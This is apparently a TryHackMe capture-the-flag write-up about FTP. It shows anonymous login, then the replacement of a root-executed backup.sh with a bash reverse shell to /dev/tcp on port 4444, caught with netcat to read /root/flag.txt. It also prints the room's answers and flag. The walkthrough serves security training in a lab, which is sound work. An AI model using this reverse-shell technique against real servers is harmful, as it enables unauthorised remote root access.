---
description: Networking - FTP
---

# Anyone can be Santa!

## Video

{% embed url="https://www.youtube.com/watch?v=i-jqFYTPEV4" %}

## Resources

The standard for these two connections are the two ports:

* Port 20 \(Data\)
* Port 21 \(Commands\)

[pentesters cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)

`bash -i >& /dev/tcp/Your_TryHackMe_IP/4444 0>&1`

## Challenge

### Name the directory on the FTP server that has data accessible by the "anonymous" user

```text
ftp 10.10.130.142
anonymous
ls
```

![](../.gitbook/assets/image%20%2871%29.png)

{% hint style="success" %}
public
{% endhint %}

### What script gets executed within this directory?

```text
ftp 10.10.130.142
anonymous
ls
cd public
ls
```

![](../.gitbook/assets/image%20%2865%29.png)

{% hint style="success" %}
backup.sh
{% endhint %}

### What movie did Santa have on his Christmas shopping list?

```text
ftp 10.10.130.142
anonymous
cd public
get shoppinglist.txt
quit
cat shoppinglist.txt
```

![](../.gitbook/assets/image%20%289%29.png)

{% hint style="success" %}
The Polar Express
{% endhint %}

### Re-upload this script to contain malicious data \(just like we did in section **9.6**. Output the contents of /root/flag.txt!

Note that the script that we have uploaded may take a minute to return a connection. If it doesn't after a couple of minutes, double-check that you have set up a Netcat listener on the device that you are working from, and have provided the TryHackMe IP of the device that you are connecting from.

```text
ftp 10.10.130.142
anonymous
cd public
get backup.sh
```

![](../.gitbook/assets/image%20%2861%29.png)

```text
vi backup.sh

bash -i >& /dev/tcp/10.14.4.204/4444 0>&1
```

![](../.gitbook/assets/image%20%2818%29.png)

```text
put backup.sh
```

![](../.gitbook/assets/image%20%286%29.png)

```text
nc -lnp 4444
cd /root
cat flag.txt
```

![](../.gitbook/assets/image%20%287%29.png)

{% hint style="success" %}
THM{even\_you\_can\_be\_santa}
{% endhint %}

